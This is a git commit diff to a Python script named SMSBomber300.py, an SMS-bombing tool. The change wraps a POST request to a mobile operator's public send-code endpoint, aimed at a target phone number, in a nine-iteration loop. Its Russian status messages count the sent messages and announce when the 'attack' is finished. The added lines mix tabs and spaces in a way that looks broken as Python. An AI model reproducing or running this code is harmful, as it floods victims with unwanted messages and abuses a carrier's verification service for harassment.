5824303a84addd121aa5dc75edb8233fde5fdfad
SibgatulinStudio <64727741+CheesStudio@users.noreply.github.com>
2020-06-30 16:52:04 +0200

    Update SMSBomber300.py

--- SMSBomber300.py
+++ SMSBomber300.py
@@ -1694,11 +1694,15 @@ if call == str(2):
             print("Атака закончена ! Нажмите на ENTER для закрытия программы......")
             break
         try:
-            requests.post('https://prod.tvh.mts.ru/tvh-public-api-gateway/public/rest/general/send-code',
+	   i=0
+	  
+	
+           while i < 9:  
+		requests.post('https://prod.tvh.mts.ru/tvh-public-api-gateway/public/rest/general/send-code',
                           params={"msisdn": _phone})
-            R = R + 1
-            print('[+] MTS отправлено! || Кол-во - ' + str(R))
-            time.sleep(0.1)
+            	R = R + 1
+            	print('[+] MTS отправлено! || Кол-во - ' + str(R))
+            	time.sleep(0.1)
         except:
             print('[-] error in sent!')
         if time.time() > start_time + float(CLOSE_AFTER):
